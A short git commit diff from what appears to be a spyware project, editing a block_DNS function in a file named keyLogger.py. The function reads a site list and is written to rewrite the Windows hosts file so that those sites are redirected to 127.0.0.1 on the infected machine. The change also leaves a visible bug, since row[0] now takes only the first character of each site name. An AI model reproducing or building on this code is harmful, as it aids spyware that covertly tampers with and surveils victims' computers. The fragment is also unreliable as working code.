dbaff36a93ce57b4a13983a613eec9204a10d161
Darlan Noetzold <41628589+DarlanNoetzold@users.noreply.github.com>
2022-08-16 08:08:49 -0300

    little changes

--- spyware/keyLogger.py
+++ spyware/keyLogger.py
@@ -14,13 +14,12 @@ import threading
 SEND_REPORT_EVERY = 30
 
 def block_DNS():
-    import csv
     path = r"C:\Windows\System32\drivers\etc\hosts"
     redirect = "\n127.0.0.1"
     websites = []
-    with open('sites.csv') as file:
-        read_csv = csv.reader(file)
-        for row in read_csv:
+    with open('sites.txt') as file:
+        contents = file.read().split(';')
+        for row in contents:
             websites.append(row[0])
     with open(path, 'r+') as file:
         content = file.read()
